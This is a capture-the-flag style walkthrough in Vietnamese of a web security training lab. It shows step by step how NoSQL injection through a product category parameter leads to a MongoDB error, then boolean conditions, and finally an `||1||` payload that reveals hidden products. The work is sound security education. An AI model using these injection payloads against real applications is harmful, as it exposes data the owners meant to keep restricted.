# **Lab: Detecting NoSQL injection**

>  The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.  
 To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.  

# **Solution**

Truy cập một danh mục bất kỳ để lấy tham số `category`:

```
https://0a720024037c4da48177705100be0095.web-security-academy.net/filter?category=Pets
```

Giờ thêm ký tự `'` để phá vỡ cấu trúc truy vấn:

```
category=Pets'
```

```
Internal Server Error

Command failed with error 139 (JSInterpreterFailure): 'SyntaxError: unterminated string literal : functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25 ' on server 127.0.0.1:27017. The full response is {"ok": 0.0, "errmsg": "SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n", "code": 139, "codeName": "JSInterpreterFailure"}
```

Thành công gây ra lỗi ở phía ứng dụng, giờ sửa lại để truy vấn chúng ta chèn là hợp lệ:

```
category=Pets'+'

URL encode: category=Pets'%2b'
```

Không có lỗi xảy ra, đồng nghĩa với việc chèn server-side này có thể thực hiện.

Giờ thêm câu điều kiện để xem việc chèn thêm điều kiện có hoạt động không:

```
category=Pets'&&1&&'x
URL encode: category=Pets'%26%261%26%26'x
```

> Pet: true  
1: true  
'x' true  
&&: and  
-> true

Các sản phẩm hiển thị bình thường trong phản hồi, giờ thử gửi điều kiện sai:

```
category=Pets'&&0&&'x
URL encode: category=Pets'%26%260%26%26'x
```

Không có sản phẩm nào được hiển thị, do điều kiện lấy từ bộ lọc là sai. Nghĩa là chúng ta thành công tự thêm điều kiện vào truy vấn của ứng dụng.

Để lấy được các sản phẩm mà không quan tâm điều kiện ẩn phía sau như `release` ta làm như sau:

```
category=Pets'||1||'
```

> ||: Or

Done, thành công lấy tất cả sản phẩm bao gồm các mặt hàng bị ẩn.

